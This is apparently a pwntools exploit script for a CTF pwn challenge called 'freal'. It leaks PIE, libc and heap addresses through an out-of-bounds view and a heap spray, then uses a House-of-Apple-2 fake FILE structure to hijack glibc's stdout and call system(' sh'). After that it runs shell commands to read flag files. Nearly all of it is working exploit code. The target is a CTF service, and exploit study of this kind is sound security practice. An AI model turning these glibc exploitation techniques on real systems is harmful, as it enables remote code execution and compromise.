#!/usr/bin/env python3
"""P1.G10: fill the 90x8MiB spray with pie+0x5020, then large-I view a
spray address. The dump is 256 bytes from the stdout slot: libc FILE* + heap.

MODE=proc  — fill chunk 0 only, I from docker /proc (mechanism proof)
MODE=search — fill all 90, stride-walk 0x7f (blind leak)
MODE=pwn — search then House-of-Apple-2 on stdout, trigger via puts
"""
from pwn import *
import os
import subprocess
import time

context.log_level = os.environ.get("LOG", "info")
context.timeout = int(os.environ.get("TIMEOUT", "180"))
context.arch = "amd64"

N = 90
LIMBS = 0x800000
FILL = int(os.environ.get("FILL", str(0x800000)))
MODE = os.environ.get("MODE", "proc")
HOST = os.environ.get("FREAL_HOST", "127.0.0.1")
PORT = int(os.environ.get("FREAL_PORT", "19999"))
USE_SSL = os.environ.get("FREAL_SSL", "0") in ("1", "true", "TRUE")
OUT = os.path.abspath(os.path.join(
    os.path.dirname(__file__), "..", "artifacts", "spray_fill_%s.txt" % MODE
))
LIBC_PATH = os.path.abspath(os.path.join(
    os.path.dirname(__file__), "..", "artifacts", "ubuntu2204", "libc.so.6"
))

STDOUT_FILE = 0x21B780
STDIN_FILE = 0x21AAA0
SYSTEM = 0x50D70
WFILE_JUMPS = 0x2170C0
ENVIRON = 0x222200


def menu(io):
    io.recvuntil(b"> ", timeout=120)


def new_decimal(io, limbs):
    menu(io)
    io.sendline(b"1")
    io.recvuntil(b"limbs: ", timeout=60)
    io.sendline(str(limbs).encode())
    io.recvuntil(b"ok\n", timeout=180)


def load(io, idx, data: bytes):
    menu(io)
    io.sendline(b"2")
    io.recvuntil(b"index: ", timeout=60)
    io.sendline(str(idx).encode())
    tok = io.recvuntil((b"bytes: ", b"nan"), drop=False, timeout=60)
    if b"bytes: " not in tok:
        return tok
    io.sendline(str(len(data)).encode())
    io.recvuntil(b"mantissa: ", timeout=60)
    io.send(data)
    return io.recvuntil(b"\n1. new decimal", drop=True, timeout=180)


def view_raw(io, idx):
    menu(io)
    io.sendline(b"3")
    io.recvuntil(b"index: ", timeout=60)
    io.sendline(str(idx).encode())
    return io.recvuntil(b"\n1. new decimal", drop=True, timeout=60)


def multiply(io, left, right, rounding=b"upward"):
    menu(io)
    io.sendline(b"6")
    io.recvuntil(b"left: ", timeout=30)
    io.sendline(str(left).encode())
    io.recvuntil(b"right: ", timeout=30)
    io.sendline(str(right).encode())
    io.recvuntil(b"rounding: ", timeout=30)
    io.sendline(rounding)
    return io.recvuntil(b"\n1. new decimal", drop=True, timeout=60)


def classify(blob: bytes):
    if b"mantissa: " in blob:
        return "HIT"
    nans = blob.count(b"nan")
    if nans >= 2:
        return "TWO_NAN"
    if nans == 1:
        return "ONE_NAN"
    return "OTHER"


def parse_dump(blob: bytes):
    if b"mantissa: " not in blob:
        return None
    body = blob.split(b"mantissa: ", 1)[1][:256]
    if len(body) < 0x48:
        return None
    return {
        "stdout": u64(body[0x00:0x08]),
        "stdin": u64(body[0x10:0x18]),
        "stderr": u64(body[0x20:0x28]),
        "heap0": u64(body[0x40:0x48]),
        "raw": body,
    }


def idx_of(addr, decimal):
    if (addr - decimal) % 8:
        addr &= ~7
    return (addr - decimal) // 8


def docker_freal_pid():
    out = subprocess.check_output(
        [
            "docker", "exec", "--user", "ctf", "freal-local", "sh", "-c",
            "for p in /proc/[0-9]*; do "
            "if [ -r \"$p/exe\" ] && [ \"$(readlink $p/exe 2>/dev/null)\" = /home/ctf/freal ]; then "
            "echo ${p#/proc/}; fi; done",
        ],
        text=True,
    )
    pids = [int(x) for x in out.split() if x.isdigit()]
    if not pids:
        raise RuntimeError("no freal pid in container")
    return max(pids)


def docker_maps(pid):
    return subprocess.check_output(
        ["docker", "exec", "--user", "ctf", "freal-local", "cat", "/proc/%d/maps" % pid],
        text=True,
    )


def libc_from_maps(maps: str):
    for line in maps.splitlines():
        if "libc.so" in line and "r-xp" in line:
            return int(line.split("-", 1)[0], 16)
    raise RuntimeError("libc not in maps")


def spray_range(maps: str, libc: int):
    for line in maps.splitlines():
        start_s, rest = line.split("-", 1)
        end_s = rest.split(" ", 1)[0]
        start, end = int(start_s, 16), int(end_s, 16)
        if end == libc and "rw-p" in line:
            return start, end
    return None, None


def house_of_apple2(fp, libc_base):
    wide = fp + 0x1E0
    wvtable = fp + 0x2D0
    lock = fp + 0x300
    return flat(
        {
            0x00: b" sh\x00",
            0x20: p64(0),
            0x28: p64(1),
            0x88: p64(lock),
            0xA0: p64(wide),
            0xD8: p64(libc_base + WFILE_JUMPS),
            0x1E0 + 0x18: p64(0),
            0x1E0 + 0x30: p64(0),
            0x1E0 + 0xE0: p64(wvtable),
            0x2D0 + 0x68: p64(libc_base + SYSTEM),
        },
        filler=b"\x00",
        length=0x380,
    )


def connect():
    if HOST in ("-", "stdio"):
        return process(["/home/y_rose/ctf/pwnsec_2026/Pwn/Freal_World_Manipulation/files/src/freal"])
    return remote(HOST, PORT, ssl=USE_SSL)


def setup(io, lines):
    v = view_raw(io, -11)
    lines.append("VIEW_-11 " + repr(v[:80]))
    if b"mantissa: " not in v:
        raise SystemExit("PIE leak failed")
    dso = u64(v.split(b"mantissa: ", 1)[1][:8].ljust(8, b"\x00"))
    pie = dso - 0x5008
    decimal = pie + 0x5060
    plant = pie + 0x5020
    lines.append("PIE %s decimal %s plant %s" % (hex(pie), hex(decimal), hex(plant)))

    t0 = time.time()
    for i in range(N):
        new_decimal(io, LIMBS)
        if i % 15 == 0:
            log.info("alloc %d/%d", i, N)
    lines.append("ALLOC_SEC %.1f" % (time.time() - t0))

    load(io, 0, b"1e200")
    load(io, 1, b"1e200")
    mout = multiply(io, 0, 1, b"upward")
    lines.append("MULTIPLY " + repr(mout[:40]))
    if b"ok" not in mout:
        raise SystemExit("multiply failed: " + repr(mout[:80]))
    return pie, decimal, plant


def fill_indices(io, plant, indices, lines):
    blob = p64(plant) * (FILL // 8)
    t0 = time.time()
    for i, idx in enumerate(indices):
        r = load(io, idx, blob)
        if b"nan" in r[:20] and b"mantissa" not in r:
            lines.append("FILL_FAIL idx=%d %s" % (idx, repr(r[:60])))
            raise SystemExit("fill failed at %d" % idx)
        if i % 10 == 0:
            log.info("fill %d/%d idx=%d", i, len(indices), idx)
    lines.append("FILL_N %d FILL_SEC %.1f" % (len(indices), time.time() - t0))


def try_view_dump(io, I, lines, tag):
    blob = view_raw(io, I)
    kind = classify(blob)
    lines.append("%s I=%d %s head=%s" % (tag, I, kind, repr(blob[:40])))
    dump = parse_dump(blob) if kind == "HIT" else None
    if dump:
        lines.append(
            "%s stdout=%s stdin=%s heap0=%s"
            % (tag, hex(dump["stdout"]), hex(dump["stdin"]), hex(dump["heap0"]))
        )
    return kind, dump


def search_spray(io, decimal, lines):
    stride = int(os.environ.get("STRIDE", str(0x20000000)))
    lo = int(os.environ.get("SEARCH_LO", str(0x7F0000000000)))
    hi = int(os.environ.get("SEARCH_HI", str(0x800000000000)))
    lines.append("SEARCH %s-%s stride=%s" % (hex(lo), hex(hi), hex(stride)))
    probed = 0
    t0 = time.time()
    addr = lo
    while addr < hi:
        I = idx_of(addr, decimal)
        blob = view_raw(io, I)
        kind = classify(blob)
        probed += 1
        if probed % 64 == 0:
            log.info("search %d addr=%s %s", probed, hex(addr), kind)
        if kind == "HIT":
            dump = parse_dump(blob)
            lines.append(
                "HIT addr=%s I=%d probes=%d sec=%.1f"
                % (hex(addr), I, probed, time.time() - t0)
            )
            if dump:
                lines.append(
                    "DUMP stdout=%s heap0=%s"
                    % (hex(dump["stdout"]), hex(dump["heap0"]))
                )
            return I, dump
        addr += stride
    lines.append("MISS probes=%d sec=%.1f" % (probed, time.time() - t0))
    return None, None


def pwn_shell(io, pie, decimal, plant, hit_I, dump, lines):
    libc = dump["stdout"] - STDOUT_FILE
    heap0 = dump["heap0"]
    lines.append("LIBC %s HEAP0 %s" % (hex(libc), hex(heap0)))
    if (libc & 0xFFF) or not (0x7F0000000000 <= libc < 0x800000000000):
        lines.append("LIBC_SANITY fail")
        return False

    fake = heap0
    payload = house_of_apple2(fake, libc)
    r = load(io, 0, payload)
    lines.append("LOAD_FAKE " + repr(r[:50]))

    r = load(io, hit_I, p64(fake))
    lines.append("HIJACK_STDOUT " + repr(r[:50]))

    menu(io)
    io.sendline(b"7")
    time.sleep(0.4)
    io.sendline(b"echo SHELLMARK; id; ls -la /home/ctf; cat /home/ctf/flag*.txt /flag* 2>/dev/null; echo DONE")
    try:
        out = io.recvuntil(b"DONE", timeout=10)
        out += io.recvrepeat(timeout=1)
    except Exception:
        try:
            out = io.recvrepeat(timeout=5)
        except Exception as e:
            out = str(e).encode()
    lines.append("SHELL " + repr(out[:800]))
    text = out.decode("latin1", "replace")
    return "pwnsec{" in text or "flag{" in text or "uid=" in text or "SHELLMARK" in text


def main():
    lines = ["TARGET %s:%d ssl=%s MODE=%s" % (HOST, PORT, USE_SSL, MODE)]
    io = connect()
    pie, decimal, plant = setup(io, lines)

    dump = None
    hit_I = None

    if MODE in ("proc", "proc-pwn"):
        fill_indices(io, plant, [0], lines)
        pid = docker_freal_pid()
        maps = docker_maps(pid)
        libc = libc_from_maps(maps)
        start, end = spray_range(maps, libc)
        ptr0 = libc - 0x803FF0
        lines.append(
            "PID %d LIBC_RX %s SPRAY %s-%s PTR0 %s"
            % (pid, hex(libc), hex(start or 0), hex(end or 0), hex(ptr0))
        )
        hit_I = idx_of(ptr0, decimal)
        kind, dump = try_view_dump(io, hit_I, lines, "PROC")
        if kind != "HIT":
            for off in range(0, 0x40, 8):
                kind, dump = try_view_dump(io, idx_of(ptr0 + off, decimal), lines, "PROC_OFF")
                if kind == "HIT":
                    hit_I = idx_of(ptr0 + off, decimal)
                    break
    else:
        fill_indices(io, plant, list(range(N)), lines)
        hit_I, dump = search_spray(io, decimal, lines)

    ok = False
    if dump and MODE in ("pwn", "proc-pwn"):
        ok = pwn_shell(io, pie, decimal, plant, hit_I, dump, lines)
    elif dump:
        libc = dump["stdout"] - STDOUT_FILE
        lines.append("LIBC %s" % hex(libc))
        lines.append("LIBC_PAGE %s" % ("yes" if (libc & 0xFFF) == 0 else "no"))
        ok = (libc & 0xFFF) == 0 and dump["heap0"] > 0x1000

    try:
        io.close()
    except Exception:
        pass

    lines.append("OK %s" % ok)
    text = "\n".join(lines) + "\n"
    open(OUT, "w").write(text)
    print(text)
    print("WROTE", OUT)
    if not dump:
        raise SystemExit(2)


if __name__ == "__main__":
    main()
